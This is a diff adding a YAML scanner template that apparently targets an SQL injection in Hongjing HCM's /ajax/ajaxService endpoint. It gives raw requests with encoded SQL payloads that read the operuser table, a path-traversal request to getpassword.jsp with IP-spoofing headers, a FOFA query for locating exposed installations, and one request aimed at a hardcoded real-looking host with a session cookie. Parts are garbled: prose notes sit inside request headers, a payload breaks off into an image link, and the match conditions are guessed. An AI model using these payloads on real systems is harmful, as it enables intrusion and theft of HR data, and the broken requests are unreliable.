@@ -1,0 +1,103 @@
+id: poc-ax18qsdugmchseze
+info:
+  name: 宏景HCM-ajaxService接口-SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ax18qsdugmchseze
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ax18qsdugmchseze
+    fofa: icon_hash="947874108" || body='<div class="hj-hy-all-one-logo"' || app="HJSOFT-HCM"
+http:
+- raw:
+  - 'POST /ajax/ajaxService HTTP/1.1
+
+    Host:crm1.dnt.com.cn
+
+    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/5317.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/5317.36
+
+    Cookie: JSESSIONID=8A569640D4EE7D518A536CC263DCBBB3
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    __type=extTrans&__xml={"functionId":"151211001137","sql":"select~20(select~20user)~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /templates/attestation/%2e%2e/%2e%2e/templates/index/getpassword.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Originating-IP: 127.0.0.1
+
+    X-Forwarded-For: 127.0.0.1
+
+    X-Remote-Addr: 127.0.0.1
+
+    X-Remote-IP: 127.0.0.1
+
+    Pragma: no-cache
+
+    Cache-Control: no-cache
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/5317.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/5317.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    payload：select user a0100,1 a0101,1 b0110,1 e0122,1 e01a1,1 dbase,1 a0000 from operuser
+
+    经过hex编码和unicode编码后得到最终poc:
+
+    post'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /ajax/ajaxService HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Originating-IP: 127.0.0.1
+
+    X-Forwarded-For: 127.0.0.1
+
+    X-Remote-Addr: 127.0.0.1
+
+    X-Remote-IP: 127.0.0.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    __type=extTrans&__xml=%7B%22functionId%22%3A%22151211001137%22%2C%22sql%22%3A%22\u0073\u0065\u006c\u0065\u0063\u0074\u007e\u0032\u0030\u0075\u0073\u0065\u0072\u007e\u0032\u0030\u0061\u007e\u0033\u0030\u007e\u0033\u0031\u007e\u0033\u0030\u007e\u0033\u0030\u007e\u0032\u0063\u007e\u0033\u0031\u007e\u0032\u0030\u0061\u007e\u0033\u0030\u007e\u0033\u0031\u007e\u0033\u0030\u007e\u0033\u0031\u007e\u0032\u0063\u007e\u0033\u0031\u007e\u0032\u0030\u0062\u007e\u0033\u0030\u007e\u0033\u0031\u007e\u0033\u0031\u007e\u0033\u0030\u007e\u0032\u0063\u007e\u0033\u0031\u007e\u0032\u0030\u0065\u007e\u0033\u0030\u007e\u0033\u0031\u007e\u0033\u0032\u007e\u0033\u0032\u007e\u0032\u0063\u007e\u0033\u0031\u007e\u0032\u0030\u0065\u007e\u0033\u0030\u007e\u0033\u0031\u0061\u007e\u0033\u0031\u007e\u0032\u0063\u007e\u0033\u0031\u007e\u0032\u0030\u0064\u0062\u0061\u0073\u0065\u007e\u0032\u0063\u007e\u0033\u0031\u007e\u0032\u0030\u0061\u007e\u00![image.png](https://image.3001.net/images/20240527/1716781091_66540023a4b67df4d5f0c.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
